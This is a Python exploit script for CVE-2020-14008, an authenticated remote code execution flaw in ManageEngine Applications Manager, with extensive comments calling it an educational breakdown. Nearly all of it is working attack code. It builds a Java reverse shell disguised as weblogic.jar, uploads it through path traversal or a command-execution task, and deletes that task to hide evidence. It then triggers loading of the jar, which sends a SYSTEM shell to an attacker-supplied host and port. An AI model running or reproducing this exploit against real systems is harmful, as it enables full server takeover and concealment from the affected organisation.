#!/usr/bin/python3
"""
================================================================================
CVE-2020-14008 - ManageEngine Applications Manager RCE (Authenticated)
================================================================================
EXPLOIT ANALYSIS & EDUCATIONAL BREAKDOWN

TARGET: ManageEngine Applications Manager <= 14720
AUTH:   Required (valid credentials needed)
IMPACT: Remote Code Execution as SYSTEM

================================================================================
VULNERABILITY EXPLANATION:
================================================================================
ManageEngine AppManager has a "Weblogic Monitor" feature that tests connections
to Oracle Weblogic servers. When testing credentials, it:

1. Looks for a JAR file at: working/classes/weblogic/version8/weblogic.jar
2. Loads the class "weblogic.jndi.Environment" from that JAR
3. Calls newInstance() on the class - EXECUTING ANY CODE IN THE CONSTRUCTOR

The exploit:
- Uploads a malicious weblogic.jar containing a reverse shell
- Triggers the "credential test" feature
- AppManager loads our malicious JAR and executes our code as SYSTEM

================================================================================
ATTACK CHAIN:
================================================================================
[1] Get initial session cookie (unauthenticated visit)
[2] Login with valid credentials → get authenticated cookie
[3] Query /common/serverinfo.do → find installation directory
[4] Compile malicious Java reverse shell → package as weblogic.jar
[5] Upload JAR via /Upload.do (try direct path traversal first)
[6] If traversal fails: upload to working/, create task to move JAR
[7] Trigger /testCredential.do with Weblogic monitor type
[8] AppManager loads our JAR → executes reverse shell → SYSTEM shell

================================================================================
"""

import requests
import urllib3
import shutil
import subprocess
import os
import sys
import random
import re
from lxml import html

# ============================================================================
# CONFIGURATION
# ============================================================================

# Debug mode - set to True for verbose output
DEBUG = True

def debug(msg):
    """Print debug messages when DEBUG is enabled"""
    if DEBUG:
        print(f"[DEBUG] {msg}")

# Proxy for Burp Suite interception (uncomment to use)
# proxy = "http://127.0.0.1:8080"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable SSL certificate warnings (self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Request timeout in seconds
timeout = 10

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def keyboard_interrupt():
    """Handle CTRL-C gracefully"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

def http_headers():
    """
    Return custom HTTP headers for requests.
    Using generic User-Agent to avoid fingerprinting.
    """
    headers = {
        'User-Agent': 'Mozilla',
    }
    debug(f"Using headers: {headers}")
    return headers

# ============================================================================
# STEP 1: GET INITIAL COOKIE (Unauthenticated)
# ============================================================================

def get_initial_cookie(url, headers):
    """
    PURPOSE: Get a session cookie before authentication

    WHY: Web apps typically require a session cookie even for login.
         We visit index.do to get JSESSIONID assigned.

    ENDPOINT: GET /index.do
    RETURNS:  Session cookies (JSESSIONID_APM_*)
    """
    print("\n" + "="*60)
    print("[STEP 1] GETTING INITIAL SESSION COOKIE")
    print("="*60)

    target = url + "/index.do"
    debug(f"Target URL: {target}")
    print(f"[*] Visiting {target} to retrieve initial cookies...")

    r = requests.get(target, headers=headers, timeout=timeout, verify=False)

    debug(f"Response Status: {r.status_code}")
    debug(f"Cookies Received: {r.cookies.get_dict()}")

    print(f"[+] Got initial cookie: {list(r.cookies.get_dict().keys())}")
    return r.cookies

# ============================================================================
# STEP 2: AUTHENTICATE & GET VALID SESSION
# ============================================================================

def get_valid_cookie(url, headers, initial_cookies, usern, passw):
    """
    PURPOSE: Login with credentials to get authenticated session

    WHY: The exploit requires admin access to:
         - View server info (get install path)
         - Upload files
         - Create/execute tasks
         - Trigger credential tests

    ENDPOINT: POST /j_security_check
    POST DATA: j_username, j_password, clienttype=html
    SUCCESS:   Response contains "Server responded in"
    """
    print("\n" + "="*60)
    print("[STEP 2] AUTHENTICATING WITH CREDENTIALS")
    print("="*60)

    target = url + "/j_security_check"
    debug(f"Target URL: {target}")
    debug(f"Username: {usern}")
    debug(f"Password: {passw}")

    # Login form data - mimics browser submission
    post_data = {
        'clienttype': 'html',      # Tell server we're a browser
        'webstart': '',
        'j_username': usern,        # Java EE standard auth param
        'ScreenWidth': '1280',
        'ScreenHeight': '709',
        'username': usern,
        'j_password': passw,        # Java EE standard auth param
        'submit': 'Login'
    }

    debug(f"POST Data: {post_data}")
    print(f"[*] Attempting login as '{usern}'...")

    r = requests.post(
        target,
        data=post_data,
        headers=headers,
        cookies=initial_cookies,
        timeout=timeout,
        verify=False
    )

    debug(f"Response Status: {r.status_code}")
    debug(f"Response Length: {len(r.text)} bytes")

    # Check for successful login indicator
    if "Server responded in " in r.text:
        print(f"[+] LOGIN SUCCESSFUL as '{usern}'!")
        debug(f"Authenticated Cookies: {r.cookies.get_dict()}")
        return r.cookies
    else:
        print("[!] LOGIN FAILED - Invalid credentials or account locked")
        debug(f"Response snippet: {r.text[:500]}")
        exit(-1)

# ============================================================================
# STEP 3: GET INSTALLATION DIRECTORY
# ============================================================================

def get_base_dir(url, headers, valid_cookie):
    """
    PURPOSE: Find where ManageEngine is installed on the target

    WHY: We need the exact path to:
         - Know where to upload/move the malicious JAR
         - Construct the correct working directory path

    ENDPOINT: GET /common/serverinfo.do?service=AppManager
    EXTRACTS: Installation path from HTML table (row 6, column 2)

    TYPICAL PATHS:
    - Windows: C:\Program Files\ManageEngine\AppManager14
    - Linux:   /opt/ManageEngine/AppManager14
    """
    print("\n" + "="*60)
    print("[STEP 3] DISCOVERING INSTALLATION DIRECTORY")
    print("="*60)

    target = url + "/common/serverinfo.do"
    params = {
        'service': 'AppManager',
        'reqForAdminLayout': 'true'
    }

    debug(f"Target URL: {target}")
    debug(f"Query Params: {params}")
    print("[*] Querying server info page...")

    r = requests.get(
        target,
        params=params,
        headers=headers,
        cookies=valid_cookie,
        timeout=timeout,
        verify=False
    )

    debug(f"Response Status: {r.status_code}")

    # Parse HTML to extract installation path
    # Path is in: <table class="lrbtborder"><tr>[6]<td>[2] title="PATH"
    tree = html.fromstring(r.content)
    pathname = tree.xpath('//table[@class="lrbtborder"]/tr[6]/td[2]/@title')

    if pathname:
        base_dir = pathname[0]
        print(f"[+] Found installation directory: {base_dir}")

        # Determine OS based on path format
        if "\\" in base_dir or ":" in base_dir:
            debug("Detected OS: Windows (backslash or drive letter)")
        else:
            debug("Detected OS: Linux/Unix (forward slash)")

        return base_dir
    else:
        print("[!] Could not extract installation directory!")
        debug(f"Response HTML snippet: {r.text[:1000]}")
        exit(-1)

# ============================================================================
# STEP 4: CREATE MALICIOUS JAR FILE
# ============================================================================

def create_jar(command, jarname, revhost, revport):
    """
    PURPOSE: Generate a malicious JAR containing a Java reverse shell

    WHY: ManageEngine loads weblogic.jar and instantiates the class
         "weblogic.jndi.Environment". When newInstance() is called,
         our code executes.

    THE TRICK: We create a fake "weblogic.jndi.Environment" class that:
    - Has a setProviderUrl() method (called by AppManager)
    - That method calls connect() which spawns a reverse shell

    REQUIREMENTS: javac and jar commands must be installed
                  (sudo apt install default-jdk)

    STRUCTURE OF MALICIOUS JAR:
    weblogic.jar
    ├── META-INF/
    │   └── MANIFEST.MF
    └── weblogic/
        └── jndi/
            └── Environment.class  ← Our reverse shell
    """
    print("\n" + "="*60)
    print("[STEP 4] CREATING MALICIOUS JAR FILE")
    print("="*60)

    print(f"[*] Reverse Shell Config:")
    print(f"    LHOST: {revhost}")
    print(f"    LPORT: {revport}")
    print(f"    Shell: {command}")

    # Java class configuration
    classname = "Environment"           # Class name AppManager expects
    pkgname = "weblogic.jndi"           # Package name AppManager expects
    fullname = pkgname + "." + classname
    manifest = "MANIFEST.MF"

    debug(f"Creating class: {fullname}")

    # Directory setup
    curdir = os.getcwd()
    metainf_dir = "META-INF"
    maindir = "weblogic"
    subdir = maindir + "/jndi"          # weblogic/jndi/
    builddir = curdir + "/" + subdir

    debug(f"Current directory: {curdir}")
    debug(f"Build directory: {builddir}")

    # Create directory structure
    print("[*] Creating directory structure...")
    try:
        if not os.path.isdir(builddir):
            os.makedirs(builddir)
            debug(f"Created: {builddir}")
    except OSError as e:
        print(f"[!] Error creating directory: {e}")
        exit(-1)

    # ========================================================================
    # JAVA REVERSE SHELL PAYLOAD
    # ========================================================================
    # This is the actual malicious Java code that will be compiled
    #
    # HOW IT WORKS:
    # 1. AppManager calls setProviderUrl() on our class
    # 2. setProviderUrl() calls connect()
    # 3. connect() spawns cmd.exe and connects stdin/stdout to a socket
    # 4. We get a shell!
    # ========================================================================

    javafile = f'''package {pkgname};

    import java.io.IOException;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.net.Socket;
    import java.util.concurrent.TimeUnit;

    public class {classname} {{

      /*
       * THIS METHOD IS THE ENTRY POINT
       * ==============================
       * AppManager's WeblogicReference.java calls:
       *   Class cls = jarLoader.loadClass("weblogic.jndi.Environment");
       *   Object env = cls.newInstance();
       *   // Then calls methods on env, including setProviderUrl()
       *
       * When setProviderUrl() is called, we trigger our reverse shell!
       */
      public void setProviderUrl(String string) throws Exception {{
        System.out.println("Hello from setProviderUrl()");
        connect();  // <-- TRIGGER REVERSE SHELL
      }}

      // Alternative entry point if JAR is run directly
      public static void main(String args[]) throws Exception {{
        System.out.println("Hello from main()");
        TimeUnit.SECONDS.sleep(10);
        connect();
      }}

      /*
       * REVERSE SHELL IMPLEMENTATION
       * ============================
       * 1. Spawn cmd.exe (or /bin/sh on Linux)
       * 2. Open socket to attacker
       * 3. Pipe process I/O through socket
       * 4. Attacker gets interactive shell
       */
      public static void connect() throws Exception {{
        String host = "{revhost}";
        int port = {revport};
        String[] cmd = {{"{command}"}};

        // Start the shell process
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();

        // Connect to attacker's listener
        Socket s = new Socket(host, port);

        // Get I/O streams
        InputStream pi = p.getInputStream();   // Process output
        InputStream pe = p.getErrorStream();   // Process errors
        InputStream si = s.getInputStream();   // Socket input (attacker commands)
        OutputStream po = p.getOutputStream(); // Process input
        OutputStream so = s.getOutputStream(); // Socket output (to attacker)

        // I/O loop - pipe everything between process and socket
        while(!s.isClosed()) {{
          // Send process output to attacker
          while(pi.available() > 0)
            so.write(pi.read());
          while(pe.available() > 0)
            so.write(pe.read());

          // Send attacker commands to process
          while(si.available() > 0)
            po.write(si.read());

          so.flush();
          po.flush();

          // Check if process died
          try {{
            p.exitValue();
            break;
          }}
          catch (Exception e) {{
            // Process still running, continue
          }}
        }}

        p.destroy();
        s.close();
      }}

    }}'''

    # Write Java source file
    print("[*] Writing Java source file...")
    os.chdir(builddir)
    with open(classname + ".java", "w") as f:
        f.write(javafile)
    debug(f"Written: {builddir}/{classname}.java")

    os.chdir(curdir)

    # ========================================================================
    # COMPILE JAVA TO BYTECODE
    # ========================================================================
    print("[*] Compiling Java source to bytecode...")
    print("    (Requires: sudo apt install default-jdk)")

    # --release 7: Compile for Java 7 compatibility (older AppManager versions)
    cmdCompile = f"javac --release 7 {subdir}/*.java"
    debug(f"Compile command: {cmdCompile}")

    result = subprocess.call(cmdCompile, shell=True)
    if result != 0:
        print("[!] COMPILATION FAILED - Is javac installed?")
        print("    Run: sudo apt install default-jdk")
        # Continue anyway - maybe there's a pre-built JAR
    else:
        print("[+] Compilation successful!")

    # ========================================================================
    # CREATE MANIFEST FILE
    # ========================================================================
    print("[*] Creating JAR manifest...")
    try:
        if not os.path.isdir(metainf_dir):
            os.makedirs(metainf_dir)
    except OSError as e:
        print(f"[!] Error creating META-INF: {e}")
        exit(-1)

    # Manifest specifies main class (not critical for this exploit)
    manifest_content = f"Main-Class: {fullname}"
    with open(f"{metainf_dir}/{manifest}", "w") as f:
        f.write(manifest_content)
    debug(f"Manifest: {manifest_content}")

    # ========================================================================
    # PACKAGE AS JAR
    # ========================================================================
    print("[*] Packaging JAR file...")

    # jar cmvf: create, manifest, verbose, file
    cmdJar = f"jar cmvf {metainf_dir}/{manifest} {jarname} {subdir}/*.class"
    debug(f"JAR command: {cmdJar}")

    result = subprocess.call(cmdJar, shell=True)
    if result != 0:
        print("[!] JAR CREATION FAILED")
    else:
        print(f"[+] Created: {jarname}")

        # Show JAR contents
        if DEBUG:
            subprocess.call(f"jar tf {jarname}", shell=True)

    # Cleanup temp directories
    print("[*] Cleaning up temporary files...")
    try:
        shutil.rmtree(metainf_dir)
        shutil.rmtree(maindir)
        debug("Cleanup complete")
    except Exception as e:
        debug(f"Cleanup warning: {e}")

    return True

# ============================================================================
# STEP 5: UPLOAD MALICIOUS JAR
# ============================================================================

def upload_jar(url, headers, valid_cookie, jarname, rel_path):
    """
    PURPOSE: Upload our malicious JAR to the target server

    STRATEGY:
    1. First, try DIRECTORY TRAVERSAL to upload directly to target location
       - Upload to: classes/weblogic/version8/weblogic.jar
       - If this works, we skip the task creation step

    2. If traversal fails, upload to default location (./)
       - Then use a scheduled task to move the file

    ENDPOINT: POST /Upload.do
    MULTIPART: theFile=<jar>, uploadDir=<path>

    TARGET LOCATION: working/classes/weblogic/version8/weblogic.jar
    (This is where WeblogicReference.java looks for the JAR)
    """
    print("\n" + "="*60)
    print("[STEP 5] UPLOADING MALICIOUS JAR")
    print("="*60)

    target = url + "/Upload.do"
    path_normal = './'                  # Default upload location
    path_trav = rel_path                # Traversal path to target

    debug(f"Upload endpoint: {target}")
    debug(f"Normal path: {path_normal}")
    debug(f"Traversal path: {path_trav}")

    # Open JAR file for upload
    jar = {'theFile': (jarname, open(jarname, 'rb'))}

    # ========================================================================
    # ATTEMPT 1: Direct path traversal upload
    # ========================================================================
    print(f"[*] Attempting direct upload to: {path_trav}")
    print("    (Using path traversal to reach target directory)")

    post_data = {'uploadDir': path_trav}
    debug(f"POST data: {post_data}")

    r = requests.post(
        target,
        data=post_data,
        headers=headers,
        files=jar,
        cookies=valid_cookie,
        timeout=timeout,
        verify=False
    )

    debug(f"Response Status: {r.status_code}")
    debug(f"Response contains 'successfully uploaded': {'successfully uploaded' in r.text}")

    if "successfully uploaded" in r.text:
        print("[+] PATH TRAVERSAL SUCCEEDED!")
        print("    JAR uploaded directly to target location")
        return "trav_path"

    # ========================================================================
    # ATTEMPT 2: Normal upload (will need task to move file)
    # ========================================================================
    print("[!] Path traversal failed, uploading to default location...")

    post_data = {'uploadDir': path_normal}
    jar = {'theFile': (jarname, open(jarname, 'rb'))}  # Re-open file

    r = requests.post(
        target,
        data=post_data,
        headers=headers,
        files=jar,
        cookies=valid_cookie,
        timeout=timeout,
        verify=False
    )

    debug(f"Normal upload response: {r.status_code}")

    if "successfully uploaded" in r.text:
        print(f"[+] Uploaded to default location: {path_normal}")
        print("    Will create task to move file to target location")
        return "normal_path"
    else:
        print("[!] UPLOAD FAILED!")
        debug(f"Response: {r.text[:500]}")
        exit(-1)

# ============================================================================
# STEP 6: CREATE TASK TO MOVE JAR (if traversal failed)
# ============================================================================

def create_task(url, headers, valid_cookie, action_name, rel_path, work_dir):
    """
    PURPOSE: Create a scheduled task to move the JAR to the correct location

    WHY: If path traversal upload failed, JAR is in the working directory.
         We need to move it to: working/classes/weblogic/version8/

         AppManager has an "Execute Program Action" feature that lets
         admins create tasks that run commands on the server.
         We abuse this to run: move weblogic.jar classes/weblogic/version8/

    ENDPOINT: POST /adminAction.do
    METHOD:   createExecProgAction
    COMMAND:  move weblogic.jar classes/weblogic/version8/

    The task runs as SYSTEM, so we have permission to move files anywhere.
    """
    print("\n" + "="*60)
    print("[STEP 6] CREATING FILE MOVE TASK")
    print("="*60)

    target = url + "/adminAction.do"
    move_cmd = f"move weblogic.jar {rel_path}"

    print(f"[*] Creating task: {action_name}")
    print(f"    Command: {move_cmd}")
    print(f"    Working Dir: {work_dir}")

    post_data = {
        'actions': '/adminAction.do?method=showExecProgAction&haid=null',
        'method': 'createExecProgAction',
        'id': '0',
        'displayname': action_name,     # Task name (random to avoid collision)
        'serversite': 'local',          # Run on local server
        'choosehost': '-2',
        'prompt': '$',
        'command': move_cmd,            # The move command
        'execProgExecDir': work_dir,    # Working directory
        'abortafter': '10',             # Timeout
        'cancel': 'false'
    }

    debug(f"POST data: {post_data}")

    r = requests.post(
        target,
        data=post_data,
        headers=headers,
        cookies=valid_cookie,
        timeout=timeout,
        verify=False
    )

    debug(f"Response Status: {r.status_code}")

    # Parse response to get the action ID
    if action_name in r.text:
        print("[+] Task created successfully!")

        # Extract action ID from response HTML
        tree = html.fromstring(r.content)
        actionurls = tree.xpath(
            '//table[@id="executeProgramActionTable"]/tr[@class="actionsheader"]/td[2]/a/@onclick'
        )
        actionnames = tree.xpath(
            '//table[@id="executeProgramActionTable"]/tr[@class="actionsheader"]/td[2]/a/text()'
        )

        debug(f"Found {len(actionnames)} actions")

        # Find our action's ID
        found_id = ""
        for i, name in enumerate(actionnames):
            if action_name in name:
                found_id = re.search(r".*actionid=(.+?)','", actionurls[i]).group(1)
                print(f"[+] Action ID: {found_id}")
                break

        if found_id:
            return found_id

    print("[!] Task creation failed!")
    debug(f"Response snippet: {r.text[:500]}")
    exit(-1)

# ============================================================================
# STEP 7: EXECUTE THE MOVE TASK
# ============================================================================

def exec_task(url, headers, valid_cookie, found_id):
    """
    PURPOSE: Execute the task we created to move the JAR file

    ENDPOINT: GET /common/executeScript.do?method=testAction&actionID=<id>

    This triggers the "move" command we configured, placing our
    malicious JAR in the location AppManager expects.
    """
    print("\n" + "="*60)
    print("[STEP 7] EXECUTING MOVE TASK")
    print("="*60)

    target = url + "/common/executeScript.do"
    params = {
        'method': 'testAction',
        'actionID': found_id,
        'haid': 'null'
    }

    print(f"[*] Executing task ID: {found_id}")
    debug(f"Target: {target}")
    debug(f"Params: {params}")

    r = requests.get(
        target,
        params=params,
        headers=headers,
        cookies=valid_cookie,
        timeout=timeout,
        verify=False
    )

    debug(f"Response Status: {r.status_code}")

    if "has been successfully executed" in r.text:
        print("[+] Task executed successfully!")
        print("    JAR file moved to target location")
    else:
        print("[!] Task execution may have failed")
        debug(f"Response snippet: {r.text[:500]}")

    return

# ============================================================================
# STEP 8: CLEANUP - DELETE THE TASK
# ============================================================================

def del_task(url, headers, valid_cookie, found_id):
    """
    PURPOSE: Delete the task we created (cleanup/stealth)

    WHY: Leaving the task would be evidence of compromise.
         Good opsec = clean up after yourself.

    ENDPOINT: POST /adminAction.do?method=deleteProgExecAction
    """
    print("\n" + "="*60)
    print("[STEP 8] CLEANUP - DELETING TASK")
    print("="*60)

    target = url + "/adminAction.do"
    params = {'method': 'deleteProgExecAction'}
    post_data = {
        'haid': 'null',
        'headercheckbox': 'on',
        'progcheckbox': found_id
    }

    print(f"[*] Deleting task ID: {found_id}")

    r = requests.post(
        target,
        params=params,
        data=post_data,
        headers=headers,
        cookies=valid_cookie,
        timeout=timeout,
        verify=False
    )

    debug(f"Response Status: {r.status_code}")
    print("[+] Task deleted (cleanup complete)")

# ============================================================================
# STEP 9: TRIGGER THE EXPLOIT - RUN CREDENTIAL TEST
# ============================================================================

def run_credtest(url, headers, valid_cookie):
    """
    PURPOSE: Trigger the vulnerable code that loads our malicious JAR

    THIS IS WHERE THE MAGIC HAPPENS!
    ================================

    When we submit a Weblogic credential test:
    1. AppManager calls WeblogicReference.lookupMBeanServer()
    2. That method looks for: working/classes/weblogic/version8/weblogic.jar
    3. It loads the class: weblogic.jndi.Environment
    4. It calls: cls.newInstance() - INSTANTIATING OUR MALICIOUS CLASS
    5. Our class's setProviderUrl() is called
    6. connect() runs → REVERSE SHELL TO ATTACKER!

    ENDPOINT: POST /testCredential.do
    KEY PARAMS:
    - montype: WEBLOGIC:7001 (tells AppManager to use Weblogic code path)
    - version: WLS_8_1 (tells it to look in version8 folder for JAR)

    The username/password/host don't matter - the JAR is loaded
    BEFORE any actual connection is attempted!
    """
    print("\n" + "="*60)
    print("[STEP 9] TRIGGERING EXPLOIT - CREDENTIAL TEST")
    print("="*60)

    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║  MAKE SURE YOUR LISTENER IS RUNNING!                     ║
    ║  nc -lvnp <PORT>                                         ║
    ╚══════════════════════════════════════════════════════════╝
    """)

    target = url + "/testCredential.do"

    # These values configure the Weblogic monitor test
    # The important ones are montype and version
    post_data = {
        'method': 'testCredentialForConfMonitors',
        'serializedData': 'url=/jsp/newConfType.jsp',
        'searchOptionValue': '',
        'query': '',
        'addtoha': 'null',
        'resourceid': '',
        'montype': 'WEBLOGIC:7001',      # CRITICAL: Use Weblogic code path
        'isAgentEnabled': 'NO',
        'resourcename': 'null',
        'isAgentAssociated': 'false',
        'hideFieldsForIT360': 'null',
        'childNodesForWDM': '[]',
        'csrfParam': '',
        'type': 'WEBLOGIC:7001',
        'displayname': 'test',
        'host': 'localhost',             # Doesn't matter - JAR loads first
        'netmask': '255.255.255.0',
        'resolveDNS': 'False',
        'port': '7001',
        'CredentialDetails': 'nocm',
        'cmValue': '-1',
        'version': 'WLS_8_1',            # CRITICAL: Look in version8/ folder
        'sslenabled': 'False',
        'username': 'test',              # Doesn't matter
        'password': 'test',              # Doesn't matter
        'pollinterval': '5',
        'groupname': ''
    }

    print("[*] Sending credential test request...")
    print("    - montype: WEBLOGIC:7001")
    print("    - version: WLS_8_1 (triggers version8/weblogic.jar load)")
    debug(f"Target: {target}")

    print("\n[*] CHECK YOUR LISTENER FOR INCOMING SHELL...")

    # This request triggers the exploit
    # It may hang or timeout because the server is busy spawning our shell
    try:
        requests.post(
            target,
            data=post_data,
            headers=headers,
            cookies=valid_cookie,
            timeout=30,  # Longer timeout - shell spawn takes time
            verify=False
        )
    except:
        pass  # Expected - server may not respond while shell is active

    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║  EXPLOIT TRIGGERED!                                      ║
    ║  If successful, you should have a SYSTEM shell           ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    return

# ============================================================================
# MAIN - ORCHESTRATE THE ATTACK
# ============================================================================

def main(argv):
    """
    FULL ATTACK FLOW:
    =================
    1. Parse command line arguments
    2. Get initial session cookie
    3. Authenticate with credentials
    4. Get installation directory
    5. Create malicious JAR with reverse shell
    6. Upload JAR (try traversal, fallback to normal upload)
    7. If normal upload: create task to move JAR, execute, cleanup
    8. Trigger credential test → SHELL!
    """

    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║  CVE-2020-14008 - ManageEngine AppManager RCE                    ║
    ║  Authenticated Remote Code Execution via Malicious JAR Upload    ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)

    # Parse arguments
    if len(sys.argv) == 6:
        url = sys.argv[1]
        usern = sys.argv[2]
        passw = sys.argv[3]
        revhost = sys.argv[4]
        revport = sys.argv[5]
    else:
        print(f"[*] Usage: {sys.argv[0]} <url> <username> <password> <LHOST> <LPORT>")
        print(f"[*] Example: {sys.argv[0]} https://192.168.1.10:8443 admin admin 192.168.1.5 4444\n")
        exit(0)

    print(f"[*] Target:   {url}")
    print(f"[*] Username: {usern}")
    print(f"[*] Password: {passw}")
    print(f"[*] LHOST:    {revhost}")
    print(f"[*] LPORT:    {revport}")

    try:
        # Setup
        headers = http_headers()

        # Configuration
        rel_path = "classes/weblogic/version8/"  # Where JAR needs to be
        random_id = str(random.randrange(0, 9999))
        action_name = "move_weblogic_jar" + random_id
        base_append = "\\working\\"
        jarname = "weblogic.jar"
        cmd = "cmd.exe"  # Windows shell

        debug(f"Relative path for JAR: {rel_path}")
        debug(f"Action name: {action_name}")
        debug(f"Shell command: {cmd}")

        # ====================================================================
        # EXECUTE ATTACK CHAIN
        # ====================================================================

        # Step 1: Get initial cookie
        initial_cookies = get_initial_cookie(url, headers)

        # Step 2: Authenticate
        valid_cookie = get_valid_cookie(url, headers, initial_cookies, usern, passw)

        # Step 3: Get install directory
        base_dir = get_base_dir(url, headers, valid_cookie)
        work_dir = base_dir + base_append
        debug(f"Working directory: {work_dir}")

        # Step 4: Create malicious JAR
        create_jar(cmd, jarname, revhost, revport)

        # Step 5: Upload JAR
        status_jar = upload_jar(url, headers, valid_cookie, jarname, rel_path)

        # Steps 6-8: If traversal failed, use task to move file
        if status_jar == "trav_path":
            # Direct traversal worked - skip to trigger
            print("\n[+] Path traversal succeeded - skipping task creation")
        elif status_jar == "normal_path":
            # Need to move file using task
            found_id = create_task(url, headers, valid_cookie, action_name, rel_path, work_dir)
            exec_task(url, headers, valid_cookie, found_id)
            del_task(url, headers, valid_cookie, found_id)

        # Step 9: TRIGGER THE EXPLOIT!
        run_credtest(url, headers, valid_cookie)

    except requests.exceptions.Timeout:
        print("[!] Request timeout - server may be processing shell")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Connection error - is target reachable?")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    main(sys.argv[1:])
